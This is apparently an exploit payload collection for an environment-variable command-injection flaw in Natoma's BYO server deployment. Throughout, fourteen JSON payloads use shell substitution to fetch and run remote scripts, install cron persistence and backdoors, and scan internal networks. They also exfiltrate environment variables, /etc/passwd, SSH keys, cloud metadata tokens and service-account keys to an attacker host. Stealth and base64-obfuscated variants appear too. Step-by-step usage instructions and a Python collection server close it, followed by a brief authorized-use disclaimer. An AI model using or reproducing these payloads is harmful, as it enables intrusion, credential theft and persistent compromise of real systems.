# Exploitation Payloads for Natoma BYO Server Vulnerability

This document contains various payloads that can be used to exploit the environment variable injection vulnerability in Natoma's BYO server deployment process.

## Basic Command Execution Payloads

### Payload 1: Simple Beacon
```json
{
  "envVars": {
    "MALICIOUS_PAYLOAD": "$(curl http://your-server.com/pwned)",
    "API_KEY": "legitimate_looking_key_123"
  }
}
```

### Payload 2: System Information Exfiltration
```json
{
  "envVars": {
    "DATABASE_URL": "postgresql://$(whoami):$(hostname)@your-server.com/stolen",
    "SYSTEM_INFO": "$(uname -a | curl -X POST -d @- http://your-server.com/sysinfo)"
  }
}
```

### Payload 3: Environment Variable Dump
```json
{
  "envVars": {
    "EXFIL_ENV": "$(env | base64 | curl -X POST -d @- http://your-server.com/env-dump)",
    "NORMAL_VAR": "legitimate_value"
  }
}
```

## Advanced Persistent Payloads

### Payload 4: Multi-Stage Attack
```json
{
  "envVars": {
    "STAGE1": "$(curl -s http://your-server.com/stage1.sh | bash)",
    "CLEANUP": "$(rm -f /tmp/stage1.sh 2>/dev/null || true)",
    "PERSISTENCE": "$(echo '*/5 * * * * curl http://your-server.com/beacon' | crontab -)"
  }
}
```

### Payload 5: Backdoor Installation
```json
{
  "envVars": {
    "BACKDOOR": "$(wget http://your-server.com/backdoor.sh -O /tmp/bd.sh && chmod +x /tmp/bd.sh && /tmp/bd.sh &)",
    "COVER_TRACKS": "$(rm -f /tmp/bd.sh 2>/dev/null)"
  }
}
```

## Stealth Payloads

### Payload 6: Hidden in Legitimate Values
```json
{
  "envVars": {
    "DATABASE_URL": "postgresql://user:pass@db.example.com/app$(curl -s http://your-server.com/hidden)",
    "LOG_LEVEL": "info; curl -s http://your-server.com/stealth >/dev/null 2>&1; echo debug",
    "API_TIMEOUT": "30$(sleep 1 && curl http://your-server.com/delayed)"
  }
}
```

### Payload 7: Base64 Encoded Commands
```json
{
  "envVars": {
    "CONFIG_DATA": "$(echo 'Y3VybCBodHRwOi8veW91ci1zZXJ2ZXIuY29tL2V4cGxvaXQ=' | base64 -d | bash)",
    "ENCODED_PAYLOAD": "dGVzdA=="
  }
}
```

## Cloud-Specific Payloads

### Payload 8: Google Cloud Metadata Access
```json
{
  "envVars": {
    "GCP_TOKEN": "$(curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | curl -X POST -d @- http://your-server.com/gcp-token)",
    "INSTANCE_INFO": "$(curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/ | curl -X POST -d @- http://your-server.com/instance-info)"
  }
}
```

### Payload 9: Service Account Key Theft
```json
{
  "envVars": {
    "SA_KEY": "$(find /tmp /var /opt -name '*service-account*' -o -name '*key*.json' 2>/dev/null | head -5 | xargs cat | curl -X POST -d @- http://your-server.com/sa-keys)",
    "CREDENTIALS": "$(env | grep -i 'key\\|token\\|secret\\|pass' | curl -X POST -d @- http://your-server.com/creds)"
  }
}
```

## Time-Delayed Payloads

### Payload 10: Delayed Execution
```json
{
  "envVars": {
    "DELAYED_ATTACK": "$(sleep 300 && curl http://your-server.com/delayed-attack.sh | bash)",
    "SCHEDULED_TASK": "$(at now + 1 hour <<< 'curl http://your-server.com/scheduled.sh | bash')"
  }
}
```

## Network Reconnaissance Payloads

### Payload 11: Internal Network Scanning
```json
{
  "envVars": {
    "NETWORK_SCAN": "$(for i in {1..254}; do ping -c1 192.168.1.$i >/dev/null 2>&1 && echo 192.168.1.$i; done | curl -X POST -d @- http://your-server.com/network-scan)",
    "PORT_SCAN": "$(nmap -sT -O localhost 2>/dev/null | curl -X POST -d @- http://your-server.com/port-scan)"
  }
}
```

### Payload 12: Service Discovery
```json
{
  "envVars": {
    "SERVICES": "$(ps aux | curl -X POST -d @- http://your-server.com/processes)",
    "NETWORK_CONNS": "$(netstat -tulpn 2>/dev/null | curl -X POST -d @- http://your-server.com/netstat)"
  }
}
```

## File System Access Payloads

### Payload 13: Sensitive File Exfiltration
```json
{
  "envVars": {
    "PASSWD_FILE": "$(cat /etc/passwd | base64 | curl -X POST -d @- http://your-server.com/passwd)",
    "SSH_KEYS": "$(find /home /root -name '.ssh' -type d 2>/dev/null | xargs -I {} find {} -name 'id_*' 2>/dev/null | xargs cat | curl -X POST -d @- http://your-server.com/ssh-keys)",
    "CONFIG_FILES": "$(find /etc -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -10 | xargs cat | curl -X POST -d @- http://your-server.com/configs)"
  }
}
```

## Container Escape Payloads

### Payload 14: Container Breakout Attempt
```json
{
  "envVars": {
    "BREAKOUT": "$(docker ps 2>/dev/null | curl -X POST -d @- http://your-server.com/docker-info)",
    "MOUNT_INFO": "$(mount | curl -X POST -d @- http://your-server.com/mounts)",
    "CAPABILITIES": "$(capsh --print | curl -X POST -d @- http://your-server.com/caps)"
  }
}
```

## Usage Instructions

1. **Choose a payload** based on your attack objectives
2. **Set up a collection server** to receive exfiltrated data
3. **Create the BYO server** in Natoma with the malicious environment variables
4. **Monitor your server** for incoming data
5. **Analyze the results** to plan further exploitation

## Collection Server Setup

Simple Python server to collect data:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime

class CollectionHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        timestamp = datetime.now().isoformat()
        print(f"[{timestamp}] Received data from {self.client_address[0]}:")
        print(post_data)
        print("-" * 50)
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), CollectionHandler)
    print("Collection server running on port 8080...")
    server.serve_forever()
```

## Warning

These payloads are for authorized security testing only. Unauthorized use is illegal and unethical. Always ensure you have proper authorization before testing these vulnerabilities.
